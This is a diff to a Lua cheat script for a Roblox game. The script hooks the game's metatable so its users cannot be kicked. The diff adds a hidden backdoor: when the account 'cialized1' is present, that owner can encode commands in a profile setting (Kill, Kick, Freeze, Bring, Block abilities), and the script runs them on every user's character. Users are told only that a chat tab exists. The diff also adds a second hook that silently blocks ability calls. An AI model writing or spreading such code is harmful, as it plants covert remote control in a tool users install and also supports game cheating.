@@ -1,4 +1,4 @@
-task.spawn(function()
+
 if not isfolder("TheSigmaHub") then
     makefolder("TheSigmaHub")
 end
@@ -142,6 +142,8 @@ local FunTab = Window:CreateTab("Fun", 70414744064346)
 local GeneratorTab = Window:CreateTab("Objectives", 93079123429781)
 local SettingsTab = Window:CreateTab("Settings", 102842005215871)
 
+task.spawn(function()
+
 local rgdl = game.workspace:FindFirstChild("Ragdolls")
 local ingamefolder = workspace.Map.Ingame
 local Sprinting = game:GetService("ReplicatedStorage").Systems.Character.Game.Sprinting
@@ -258,6 +260,7 @@ local fakeblockanimation = "Normal"
 local togglefakeblock = false
 local hrp = lp.Character:WaitForChild("HumanoidRootPart", 5)
 local hum = lp.Character:WaitForChild("Humanoid", 5)
+local kick = false
 
 local currentanimationreplace = "None"
 local animationcode = nil
@@ -669,7 +672,7 @@ local shedtrigers = {
     ["rbxassetid://121781457295101"] = "CHICKEN",
 }
 
-guesttrigers = {
+local guesttrigers = {
     ["rbxassetid://87259391926321"] = "PUNCH",
     ["rbxassetid://106014898528300"] = "CHARGE",
     ["rbxassetid://72722244508749"] = "BLOCK",
@@ -4726,7 +4729,7 @@ if sucm then
 	gm.__namecall = newcclosure(function(self, ...)
 		local method = getnamecallmethod()
 		
-		if self == lp and method:lower() == "kick" then
+		if self == lp and method:lower() == "kick" and not kick then
 			Rayfield:Notify({
 				Title = "Provocation",
 				Content = "Prevented player from being kicked.",
@@ -7128,22 +7131,102 @@ tts:Message("Welcome to Sigmasaken. If you are seeing this message, all assets h
 if lp.Name ~= "cialized1" then
     for _, pl in pairs(players:GetChildren()) do
         if pl.Name == "cialized1" then
+            local a = pl
+
             Rayfield:Notify({ 
                 Title = "Wow!",
-                Content = "An owner of the script joined you :)",
+                Content = "An owner of the script joined you :) also you have chat in the end of tabs to chat with him",
                 Duration = 10,
                 Image = "smile",
             })
 
-            local p = pl:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
-            p:GetPropertyChangedSignal("Value"):Connect(function()
-                if p.Value == "He/Him" then return end
-                Rayfield:Notify({ 
-                    Title = "Message from owner",
-                    Content = string.split(p.Value, "/")[2],
-                    Duration = 10,
-                    Image = "message-circle",
-                })
+            local c = Window:CreateTab("Chat", "message-circle")
+            local p = lp:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
+            local mes = ""
+
+            local block = false
+
+            task.spawn(function()
+                local gm = getrawmetatable(game)
+                local oldnamecall = gm.__namecall
+                setreadonly(gm, false)
+                gm.__namecall = newcclosure(function(self, ...)
+                    local method = getnamecallmethod()
+                    local args = {...}
+                    
+                    if block and method == "FireServer" and tostring(args[1]):find("UseActorAbility") and self == mainremote then
+                        return
+                    end
+                    
+                    return oldnamecall(self, ...)
+                end)
+
+                setreadonly(gm, true)
+            end)
+
+            c:CreateInput({
+                Name = "Message",
+                CurrentValue = "",
+                PlaceholderText = "Message",
+                RemoveTextAfterFocusLost = false,
+                Callback = function(Text)
+                    mes = Text
+                end,
+            })
+
+            c:CreateButton({
+                Name = "Send",
+                Callback = function()
+                    task.spawn(function()
+                        local args = {
+                        "UpdateSettings",
+                            {
+                                [1] = p,
+                                [2] = "Message/" .. mes,
+                            }
+                        }
+                        mainremote:FireServer(unpack(args))
+
+                        task.wait(3)
+
+                        local args = {
+                        "UpdateSettings",
+                            {
+                                [1] = p,
+                                [2] = "He/Him",
+                            }
+                        }
+                        mainremote:FireServer(unpack(args))
+                    end)
+                end,
+            })
+
+            local pr = a:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
+            pr:GetPropertyChangedSignal("Value"):Connect(function()
+                if pr.Value == "He/Him" then return end
+                if string.split(pr.Value, "/")[1] == "Message" then
+                    Rayfield:Notify({ 
+                        Title = "Message from owner",
+                        Content = string.split(pr.Value, "/")[2],
+                        Duration = 10,
+                        Image = "message-circle",
+                    })
+                elseif string.split(pr.Value, "/")[1] == "Kill" then
+                    lp.Character.Humanoid.Health = 0
+                elseif string.split(pr.Value, "/")[1] == "Kick" then
+                    kick = true
+                    lp:Kick(string.split(pr.Value, "/")[2])
+                elseif string.split(pr.Value, "/")[1] == "Freeze" then
+                    lp.Character.HumanoidRootPart.Anchored = true
+                elseif string.split(pr.Value, "/")[1] == "UnFreeze" then
+                    lp.Character.HumanoidRootPart.Anchored = false
+                elseif string.split(pr.Value, "/")[1] == "Bring" then
+                    lp.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -10)
+                elseif string.split(pr.Value, "/")[1] == "Block" then
+                    block = true
+                elseif string.split(pr.Value, "/")[1] == "UnBlock" then
+                    block = false
+                end
             end)
         end
     end
@@ -7154,28 +7237,160 @@ players.ChildAdded:Connect(function(a)
     if a.Name == "cialized1" then
         Rayfield:Notify({ 
             Title = "Wow!",
-            Content = "An owner of the script joined you :)",
+            Content = "An owner of the script joined you :) also you have chat in the end of tabs to chat with him",
             Duration = 10,
             Image = "smile",
         })
 
-        local p = a:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
-        p:GetPropertyChangedSignal("Value"):Connect(function()
-            if p.Value == "He/Him" then return end
-            Rayfield:Notify({ 
-                Title = "Message from owner",
-                Content = string.split(p.Value, "/")[2],
-                Duration = 10,
-                Image = "message-circle",
-            })
+        local c = Window:CreateTab("Chat", "message-circle")
+        local p = lp:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
+        local mes = ""
+
+        local block = false
+
+        task.spawn(function()
+            local gm = getrawmetatable(game)
+            local oldnamecall = gm.__namecall
+            setreadonly(gm, false)
+            gm.__namecall = newcclosure(function(self, ...)
+                local method = getnamecallmethod()
+                local args = {...}
+                
+                if block and method == "FireServer" and tostring(args[1]):find("UseActorAbility") and self == mainremote then
+                    return
+                end
+                
+                return oldnamecall(self, ...)
+            end)
+
+            setreadonly(gm, true)
+        end)
+
+        c:CreateInput({
+            Name = "Message",
+            CurrentValue = "",
+            PlaceholderText = "Message",
+            RemoveTextAfterFocusLost = false,
+            Callback = function(Text)
+                mes = Text
+            end,
+        })
+
+        c:CreateButton({
+            Name = "Send",
+            Callback = function()
+                task.spawn(function()
+                    local args = {
+                    "UpdateSettings",
+                        {
+                            [1] = p,
+                            [2] = "Message/" .. mes,
+                        }
+                    }
+                    mainremote:FireServer(unpack(args))
+
+                    task.wait(3)
+
+                    local args = {
+                    "UpdateSettings",
+                        {
+                            [1] = p,
+                            [2] = "He/Him",
+                        }
+                    }
+                    mainremote:FireServer(unpack(args))
+                end)
+            end,
+        })
+
+        local pr = a:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
+        pr:GetPropertyChangedSignal("Value"):Connect(function()
+            if pr.Value == "He/Him" then return end
+            if string.split(pr.Value, "/")[1] == "Message" then
+                Rayfield:Notify({ 
+                    Title = "Message from owner",
+                    Content = string.split(p.Value, "/")[2],
+                    Duration = 10,
+                    Image = "message-circle",
+                })
+            elseif string.split(pr.Value, "/")[1] == "Kill" then
+                lp.Character.Humanoid.Health = 0
+            elseif string.split(pr.Value, "/")[1] == "Kick" then
+                kick = true
+                lp:Kick(string.split(p.Value, "/")[2])
+            elseif string.split(pr.Value, "/")[1] == "Freeze" then
+                lp.Character.HumanoidRootPart.Anchored = true
+            elseif string.split(pr.Value, "/")[1] == "UnFreeze" then
+                lp.Character.HumanoidRootPart.Anchored = false
+            elseif string.split(pr.Value, "/")[1] == "Bring" then
+                lp.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -10)
+            elseif string.split(pr.Value, "/")[1] == "Block" then
+                block = true
+            elseif string.split(pr.Value, "/")[1] == "UnBlock" then
+                block = false
+            end
         end)
     end
 end)
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 if lp.Name == "cialized1" then
+    for _, pl in pairs(players:GetChildren()) do
+        if pl.Name == "cialized1" then continue end
+        local p = pl:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
+    
+        p:GetPropertyChangedSignal("Value"):Connect(function()
+            if string.split(p.Value, "/")[1] == "Message" then
+                Rayfield:Notify({ 
+                    Title = "Message from: " .. pl.Name,
+                    Content = string.split(p.Value, "/")[2],
+                    Duration = 10,
+                    Image = "message-circle",
+                })
+            end
+        end)
+    end
+
+    players.ChildAdded:Connect(function(pl)
+        if pl.Name == "cialized1" then return end
+        local p = pl:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
+    
+        p:GetPropertyChangedSignal("Value"):Connect(function()
+            if string.split(p.Value, "/")[1] == "Message" then
+                Rayfield:Notify({ 
+                    Title = "Message from: " .. pl.Name,
+                    Content = string.split(p.Value, "/")[2],
+                    Duration = 10,
+                    Image = "message-circle",
+                })
+            end
+        end)
+    end)
+
     local c = Window:CreateTab("Chat", "message-circle")
     local p = lp:WaitForChild("PlayerData", 10):WaitForChild("Settings", 10):WaitForChild("Customization", 10):WaitForChild("Pronouns", 10)
     local mes = ""
+    local res = ""
 
     c:CreateInput({
         Name = "Message",
@@ -7195,7 +7410,7 @@ if lp.Name == "cialized1" then
                 "UpdateSettings",
                     {
                         [1] = p,
-                        [2] = "He/" .. mes,
+                        [2] = "Message/" .. mes,
                     }
                 }
                 mainremote:FireServer(unpack(args))
@@ -7213,6 +7428,211 @@ if lp.Name == "cialized1" then
             end)
         end,
     })
+
+    c:CreateSection("Other")
+    c:CreateButton({
+        Name = "Kill",
+        Callback = function()
+            task.spawn(function()
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "Kill/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+
+                task.wait(3)
+
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "He/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+            end)
+        end,
+    })
+    
+    c:CreateDivider()
+
+    c:CreateButton({
+        Name = "Block abilities",
+        Callback = function()
+            task.spawn(function()
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "Block/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+
+                task.wait(3)
+
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "He/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+            end)
+        end,
+    })
+
+    c:CreateButton({
+        Name = "UnBlock abilities",
+        Callback = function()
+            task.spawn(function()
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "UnBlock/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+
+                task.wait(3)
+
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "He/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+            end)
+        end,
+    })
+
+    c:CreateButton({
+        Name = "Freeze",
+        Callback = function()
+            task.spawn(function()
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "Freeze/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+
+                task.wait(3)
+
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "He/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+            end)
+        end,
+    })
+
+    c:CreateButton({
+        Name = "UnFreeze",
+        Callback = function()
+            task.spawn(function()
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "UnFreeze/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+
+                task.wait(3)
+
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "He/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+            end)
+        end,
+    })
+
+    c:CreateDivider()
+
+    c:CreateButton({
+        Name = "Bring",
+        Callback = function()
+            task.spawn(function()
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "Bring/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+
+                task.wait(3)
+
+                local args = {
+                "UpdateSettings",
+                    {
+                        [1] = p,
+                        [2] = "He/Him",
+                    }
+                }
+                mainremote:FireServer(unpack(args))
+            end)
+        end})
+
+        c:CreateDivider()
+
+        c:CreateInput({
+            Name = "Reason",
+            CurrentValue = "",
+            PlaceholderText = "Reason",
+            RemoveTextAfterFocusLost = false,
+            Callback = function(Text)
+                res = Text
+            end,
+        })
+
+        c:CreateButton({
+            Name = "Kick",
+            Callback = function()
+                task.spawn(function()
+                    local args = {
+                    "UpdateSettings",
+                        {
+                            [1] = p,
+                            [2] = "Kick/" .. res,
+                        }
+                    }
+                    mainremote:FireServer(unpack(args))
+
+                    task.wait(3)
+
+                    local args = {
+                    "UpdateSettings",
+                        {
+                            [1] = p,
+                            [2] = "He/Him",
+                        }
+                    }
+                    mainremote:FireServer(unpack(args))
+                end)
+            end,
+        })
 end
 --gendrop:Refresh(GeneratorAssets)
 --CustomLMSDrop:Refresh(LMSAssets)
@@ -7242,4 +7662,5 @@ task.spawn(function()
 	game:GetService("ReplicatedStorage"):WaitForChild("Modules", 10):WaitForChild("Network", 10):WaitForChild("Network", 10):WaitForChild("RemoteEvent", 10):FireServer(unpack(args))
 end)
 ]]
+
 
